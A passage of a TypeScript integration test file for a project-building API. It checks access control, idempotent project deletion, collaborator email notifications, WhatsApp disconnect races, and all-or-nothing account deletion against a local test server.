  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "field-remove-owner2@example.com");
    const outsiderToken = await signup(baseUrl, "field-remove-outsider2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };

    const res = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}/fields/${project.spec.entities[0].fields[0].name}`,
      { method: "DELETE", headers: authHeaders(outsiderToken) },
    );
    assert.equal(res.status, 404);
  });
});

test("removing a field from a project that's already been built is rejected with FIELD_REMOVE_AFTER_BUILD, since the real database column and generated code for it already exist", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-remove-afterbuild@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const res = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}/fields/${project.spec.entities[0].fields[0].name}`,
      { method: "DELETE", headers: authHeaders(token) },
    );
    assert.equal(res.status, 409);
    assert.equal(((await res.json()) as { code?: string }).code, "FIELD_REMOVE_AFTER_BUILD");
  });
});

test("adding a blank/whitespace-only assumption is rejected with 400 instead of appending an empty string", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-add-blank@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ assumption: "" }),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(unchanged.spec.assumptions, project.spec.assumptions);
  });
});

test("adding an assumption on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-add-owner2@example.com");
    const outsiderToken = await signup(baseUrl, "assumption-add-outsider2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ assumption: "Should not be added" }),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can delete a built project, and afterward the project, its real data, its checkpoint, and a collaborator's access are all genuinely gone -- not just hidden", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "delete-owner1@example.com");
    const collabToken = await signup(baseUrl, "delete-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "delete-collab1@example.com" }),
    });

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    await collectSSE(buildRes);

    // Confirm there's real state to lose before deleting: seeded data, and
    // a checkpoint from the build the Forge agent just snapshotted.
    const beforeCheckpoints = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(ownerToken) });
    const { checkpoints: checkpointsBefore } = (await beforeCheckpoints.json()) as { checkpoints: unknown[] };
    assert.ok(checkpointsBefore.length > 0, "sanity check: the build should have snapshotted a checkpoint");
    const collabListBefore = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(collabToken) });
    const { projects: collabProjectsBefore } = (await collabListBefore.json()) as { projects: { id: string }[] };
    assert.ok(collabProjectsBefore.some((p) => p.id === project.id), "sanity check: the collaborator should see it before deleting");

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(ownerToken) });
    assert.equal(deleteRes.status, 204);

    // The project itself: gone for the owner.
    const getAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    assert.equal(getAfter.status, 404);

    // The collaborator's grant: gone too, not orphaned pointing at nothing.
    const getAfterCollab = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
    assert.equal(getAfterCollab.status, 404);
    const collabListAfter = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(collabToken) });
    const { projects: collabProjectsAfter } = (await collabListAfter.json()) as { projects: { id: string }[] };
    assert.ok(!collabProjectsAfter.some((p) => p.id === project.id), "the collaborator's own project list must no longer include it");

    // The owner's own list no longer includes it either.
    const ownerListAfter = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(ownerToken) });
    const { projects: ownerProjectsAfter } = (await ownerListAfter.json()) as { projects: { id: string }[] };
    assert.ok(!ownerProjectsAfter.some((p) => p.id === project.id));
  });
});

test("a collaborator cannot delete a project -- only the owner can, since deleting removes everyone's access, not just their own", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "delete-owner2@example.com");
    const collabToken = await signup(baseUrl, "delete-collab2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "delete-collab2@example.com" }),
    });

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(collabToken) });
    assert.equal(deleteRes.status, 404);

    // Must still exist, for the owner and the collaborator alike.
    const getByOwner = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(ownerToken) });
    assert.equal(getByOwner.status, 200);
    const getByCollab = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
    assert.equal(getByCollab.status, 200);
  });
});

test("deleting a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "delete-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "delete-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(outsiderToken) });
    assert.equal(deleteRes.status, 404);
  });
});

/**
 * Round 945: same withIdempotency gap, and the same fix, as
 * deleteRecord's/deleteCheckpoint's own fix (rounds 792/944) -- the single
 * most destructive route in the app (an irreversible, cascading
 * whole-project delete) had zero idempotency coverage. fetchWithWakeRetry
 * retries on ANY thrown fetch() error, so a response lost in transit after
 * the project was already deleted used to surface a confusing 404 for a
 * delete that, from the user's point of view, already fully succeeded.
 */
test("DELETE /projects/:id retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing on the already-deleted project", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "project-delete-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const headers = { ...authHeaders(token), "x-idempotency-key": "project-delete-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers });
    assert.equal(firstRes.status, 204);

    const getAfterFirst = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    assert.equal(getAfterFirst.status, 404, "the project must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers });
    assert.equal(
      retryRes.status,
      204,
      "a retried deletion with the same idempotency key must replay the original success, not 404 on the already-deleted project",
    );
  });
});

test("deleting a project sends a real notification to every remaining collaborator, naming the project, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-delete-notify-${Date.now()}@example.com`);
      const collabEmailA = `collab-a-delete-notify-${Date.now()}@example.com`;
      const collabEmailB = `collab-b-delete-notify-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmailA);
      await signup(baseUrl, collabEmailB);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmailA }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmailB }),
      });
      emailSender.sentTo.length = 0; // The 2 invites themselves (round 1253) also send -- only the delete's own sends matter here.

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}?lang=en`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204);

      assert.equal(emailSender.sentTo.length, 2, "exactly one notification per remaining collaborator must be sent");
      const recipients = emailSender.sentTo.map((m) => m.to).sort();
      assert.deepEqual(recipients, [collabEmailA, collabEmailB].sort(), "the notifications must go to the two collaborators, never the owner who initiated the delete");
      const namePattern = new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
      for (const message of emailSender.sentTo) {
        assert.match(message.text, namePattern, "each notification's body must name the real project");
      }
    },
    { emailSender },
  );
});

test("deleting a project itself still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-delete-notify-unconfigured-${Date.now()}@example.com`);
      const collabEmail = `collab-delete-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204, "the delete itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

test("deleting a project with no collaborators sends no notification, and the delete still succeeds", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-delete-notify-solo-${Date.now()}@example.com`);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204);
      assert.equal(emailSender.sentTo.length, 0, "a project with no collaborators has nobody to notify");
    },
    { emailSender },
  );
});

test("deleting a project with a live WhatsApp connection tears the connection down cleanly instead of erroring", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "delete-whatsapp1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(token) });
      assert.equal(deleteRes.status, 204);

      const getAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
      assert.equal(getAfter.status, 404);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Regression test (round 534): DELETE /projects/:id's own real await --
 * whatsapp.disconnect() -> a genuine network round-trip when a WhatsApp Web
 * socket is connected -- used to run with no activePipelines protection of
 * its own. Every ordinary quick mutation route (add a role, here) only
 * *checks* activePipelines; it never sets it. During DELETE's own await
 * window, such a route could read the still-present project row, run its
 * whole update to completion, and return 200 for a change deleteProject()
 * erases moments later with no error ever reaching that caller. Holds
 * logout() open with a controlled promise (this file's own established
 * technique for a deterministic race, not a real timer) to land exactly
 * inside that window before firing the concurrent request.
 */
test("DELETE /projects/:id rejects a concurrent mutation that lands during its own WhatsApp-disconnect await, instead of silently discarding it", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  let releaseLogout!: () => void;
  const logoutHeld = new Promise<void>((resolve) => {
    releaseLogout = resolve;
  });
  let resolveLogoutEntered!: () => void;
  const logoutEntered = new Promise<void>((resolve) => {
    resolveLogoutEntered = resolve;
  });

  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "delete-race1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const deletePromise = fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(token) });

      // Wait for DELETE's own logout() await to actually be entered (same
      // technique as round 424's "waits for logout() to actually be
      // entered") before firing the concurrent mutation -- guarantees it
      // lands inside the window, not before or after it.
      await logoutEntered;

      const roleRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ role: "Race Tester" }),
      });
      const roleBody = (await roleRes.json()) as { code?: string };

      releaseLogout();
      const deleteRes = await deletePromise;

      assert.equal(roleRes.status, 409, "a mutation landing during DELETE's own await must be rejected, not silently discarded");
      assert.equal(roleBody.code, "PIPELINE_IN_PROGRESS");
      assert.equal(deleteRes.status, 204);

      const getAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
      assert.equal(getAfter.status, 404);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db, {
          logout: async () => {
            resolveLogoutEntered();
            await logoutHeld;
          },
        });
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

test("DELETE /auth/account rejects a collaborator's concurrent mutation that lands during its own per-project WhatsApp-disconnect await, instead of silently discarding it", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  let releaseLogout!: () => void;
  const logoutHeld = new Promise<void>((resolve) => {
    releaseLogout = resolve;
  });
  let resolveLogoutEntered!: () => void;
  const logoutEntered = new Promise<void>((resolve) => {
    resolveLogoutEntered = resolve;
  });

  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, "account-delete-race-owner@example.com");
      const collabToken = await signup(baseUrl, "account-delete-race-collab@example.com");

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: "account-delete-race-collab@example.com" }),
      });
      assert.equal(inviteRes.status, 201);

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(ownerToken) });
      createdSockets[0].sock.user = { id: "15550002222:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const deletePromise = fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(ownerToken) });

      // Same technique as DELETE /projects/:id's own race test above: wait
      // for this loop's logout() await to actually be entered before
      // firing the concurrent mutation, so it's guaranteed to land inside
      // the window. Uses the COLLABORATOR's own token, not the owner's --
      // deleteAllSessionsForUser only revokes the account being deleted,
      // so the collaborator's session is still perfectly valid here.
      await logoutEntered;

      const roleRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
        method: "POST",
        headers: authHeaders(collabToken),
        body: JSON.stringify({ role: "Race Tester" }),
      });
      const roleBody = (await roleRes.json()) as { code?: string };

      releaseLogout();
      const deleteRes = await deletePromise;

      assert.equal(
        roleRes.status,
        409,
        "a collaborator's mutation landing during DELETE /auth/account's own per-project await must be rejected, not silently discarded",
      );
      assert.equal(roleBody.code, "PIPELINE_IN_PROGRESS");
      assert.equal(deleteRes.status, 204);

      const getAfter = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(collabToken) });
      assert.equal(getAfter.status, 404);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db, {
          logout: async () => {
            resolveLogoutEntered();
            await logoutHeld;
          },
        });
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

test("POST .../whatsapp/send does not insert a permanently-orphaned message row when the project is deleted while the send is still in flight", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  let releaseSend!: () => void;
  const sendHeld = new Promise<void>((resolve) => {
    releaseSend = resolve;
  });
  let resolveSendEntered!: () => void;
  const sendEntered = new Promise<void>((resolve) => {
    resolveSendEntered = resolve;
  });

  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "send-delete-race@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550003333:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      // An internationally-formatted number is required: a bare
      // local-format number is rejected synchronously by sendMessage's own
      // missing_country_code check before ever reaching the held await.
      const sendPromise = fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "hello" }),
      });

      // Same technique as this file's other in-flight-await races: wait for
      // the send's own await to actually be entered before deleting the
      // project out from under it.
      await sendEntered;

      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(token) });
      assert.equal(deleteRes.status, 204);

      const getAfterDelete = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
      assert.equal(getAfterDelete.status, 404);

      releaseSend();
      const sendRes = await sendPromise;

      assert.equal(
        sendRes.status,
        404,
        "a send that resolves after its project was deleted must not report success or insert an orphaned message row",
      );
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db, {
          sendMessage: async () => {
            resolveSendEntered();
            await sendHeld;
          },
        });
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

test("DELETE /auth/account is all-or-nothing: an in-flight pipeline on one owned project must not leave an earlier project in the same loop permanently deleted", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const email = `account-delete-atomic-${Math.random()}@example.com`;
      const password = "correct-horse-battery";
      const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const { token } = (await signupRes.json()) as { token: string };

      // Project A is created and built first -- listOwnedProjectIds returns
      // rows in insertion order, so the account-deletion loop reaches A
      // before B and would delete it before ever reaching B's own guard.
      const createARes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project: projectA } = (await createARes.json()) as { project: { id: string } };
      await collectSSE(await fetch(`${baseUrl}/api/projects/${projectA.id}/build`, { method: "POST", headers: authHeaders(token) }));

      const createBRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A library with books and members." }),
      });
      const { project: projectB } = (await createBRes.json()) as { project: { id: string } };
      await collectSSE(await fetch(`${baseUrl}/api/projects/${projectB.id}/build`, { method: "POST", headers: authHeaders(token) }));

      // Arm the gate only now, so project A/B's own creation+build calls
      // (already done above) are unaffected -- only B's upcoming /refine
      // blocks.
      gated.arm();
      const refinePromise = fetch(`${baseUrl}/api/projects/${projectB.id}/refine`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ instruction: "add a status field" }),
      });
      await gated.waitUntilStarted();

      const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(token) });
      const deleteBody = (await deleteRes.json()) as { code?: string };

      gated.release();
      const refineRes = await refinePromise;
      if (refineRes.ok) await collectSSE(refineRes);

      assert.equal(deleteRes.status, 409, "deletion must be rejected while any owned project has an in-flight pipeline");
      assert.equal(deleteBody.code, "PIPELINE_IN_PROGRESS");

      // The account itself must still exist -- re-login must succeed.
      const reLoginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      assert.equal(reLoginRes.status, 200, "a rejected deletion must not have removed the account");
      const { token: newToken } = (await reLoginRes.json()) as { token: string };

      // Neither project may have been touched -- all-or-nothing.
      const getARes = await fetch(`${baseUrl}/api/projects/${projectA.id}`, { headers: authHeaders(newToken) });
      const getBRes = await fetch(`${baseUrl}/api/projects/${projectB.id}`, { headers: authHeaders(newToken) });
      assert.equal(getARes.status, 200, "project A must survive a rejected, all-or-nothing deletion");
      assert.equal(getBRes.status, 200, "project B must survive a rejected, all-or-nothing deletion");
    },
    { provider: gated.provider },
  );
});

/**
 * Round 1259: DELETE /auth/account's per-project deletion loop
 * (apps/api/src/routes/auth.ts) is a second, structurally separate call site
 * of the same deleteProject() that DELETE /projects/:id calls -- round 1256
 * added a "this project was deleted" notification to every remaining
 * collaborator there, but that route's own loop never got the same fix,
 * even though deleteProject's cascade revokes those collaborators' access
 * the exact same way either way the project is deleted.
 */
test("deleting your account sends a real notification to every remaining collaborator on each project you owned, naming the project, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-acct-delete-notify-${Date.now()}@example.com`);
      const collabEmailA = `collab-a-acct-delete-notify-${Date.now()}@example.com`;
      const collabEmailB = `collab-b-acct-delete-notify-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmailA);
      await signup(baseUrl, collabEmailB);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmailA }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmailB }),
      });
      emailSender.sentTo.length = 0; // The 2 invites themselves (round 1253) also send -- only the account-deletion's own sends matter here.

      const deleteRes = await fetch(`${baseUrl}/api/auth/account?lang=en`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204);

      assert.equal(emailSender.sentTo.length, 2, "exactly one notification per remaining collaborator must be sent");
      const recipients = emailSender.sentTo.map((m) => m.to).sort();
      assert.deepEqual(recipients, [collabEmailA, collabEmailB].sort(), "the notifications must go to the two collaborators, never the account being deleted");
      const namePattern = new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
      for (const message of emailSender.sentTo) {
        assert.match(message.text, namePattern, "each notification's body must name the real project");
      }
    },
    { emailSender },
  );
});

/**
 * Round 1277: round 1259's own fix (just above) only ever notifies
 * collaborators of a project THIS account OWNED, once it's deleted --
 * removeAllCollaborationsForUser (packages/db/src/collaborators.ts),
 * which silently strips this account from every OTHER project it merely
 * collaborated on, never got the matching fix: that project's own OWNER
 * had zero signal their roster just shrank. Confirms deleting an account
 * that collaborates on someone else's project sends that project's
 * owner a real notification naming the project and the deleted
 * collaborator, and that the project itself (and its real owner's own
 * access) is completely untouched -- this account was never more than a
 * collaborator on it.
 */
test("deleting your account notifies the OWNER of every project you merely collaborated on (never owned), naming the project", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const otherOwnerEmail = `other-owner-acct-delete-notify-${Date.now()}@example.com`;
      const otherOwnerToken = await signup(baseUrl, otherOwnerEmail);
      const leavingEmail = `leaving-collab-acct-delete-notify-${Date.now()}@example.com`;
      const leavingToken = await signup(baseUrl, leavingEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(otherOwnerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(otherOwnerToken),
        body: JSON.stringify({ email: leavingEmail }),
      });
      emailSender.sentTo.length = 0; // The invite itself (round 1253) also sends -- only the account-deletion's own send matters here.

      const deleteRes = await fetch(`${baseUrl}/api/auth/account?lang=en`, { method: "DELETE", headers: authHeaders(leavingToken) });
      assert.equal(deleteRes.status, 204);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent, to the OTHER project's owner");
      assert.equal(emailSender.sentTo[0].to, otherOwnerEmail, "the notification must go to the real owner, never the account being deleted");
      assert.match(emailSender.sentTo[0].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");
      assert.match(emailSender.sentTo[0].text, new RegExp(leavingEmail.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the collaborator whose account was deleted");

      const getProjectRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(otherOwnerToken) });
      assert.equal(getProjectRes.status, 200, "the project itself, owned by a DIFFERENT account, must survive completely untouched");
    },
    { emailSender },
  );
});

test("deleting your account itself still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-acct-delete-notify-unconfigured-${Date.now()}@example.com`);
      const collabEmail = `collab-acct-delete-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });

      const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204, "account deletion itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

test("deleting your account with an owned project that has no collaborators sends no notification, and the deletion still succeeds", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-acct-delete-notify-solo-${Date.now()}@example.com`);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
